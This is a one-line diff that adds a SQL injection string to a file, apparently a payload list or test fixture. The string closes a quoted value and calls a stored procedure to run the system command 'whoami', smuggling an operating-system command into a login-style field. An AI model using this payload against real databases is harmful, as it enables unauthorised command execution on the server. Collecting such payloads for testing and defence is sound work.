@@ -1,0 +1,1 @@
+admin'; CALL sys.system('whoami')--
